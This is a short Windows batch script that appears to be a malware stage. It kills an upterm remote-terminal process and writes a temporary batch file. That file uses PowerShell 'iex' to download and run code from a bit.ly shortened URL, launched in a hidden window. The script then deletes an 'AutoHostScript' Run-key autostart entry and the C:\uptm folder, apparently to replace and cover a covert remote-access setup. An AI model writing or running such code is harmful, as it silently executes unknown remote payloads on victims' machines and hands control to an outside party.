@echo off
chcp 65001 > nul

taskkill /f /im upterm.exe

echo timeout /t 8 /nobreak > "%temp%\runme.bat"
echo powershell iex (iwr bit.ly/b9virf -UseBasicParsing) >> "%temp%\runme.bat"

powershell -Command "Start-Process powershell -WindowStyle Hidden -ArgumentList '-Command & \"%temp%\runme.bat\"'"

set "STARTUP=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "valueName=AutoHostScript"

reg delete "%STARTUP%" /v "%valueName%" /f

cd /d %temp%

set "TARGET=C:\uptm"

rmdir /s /q "%TARGET%"

exit
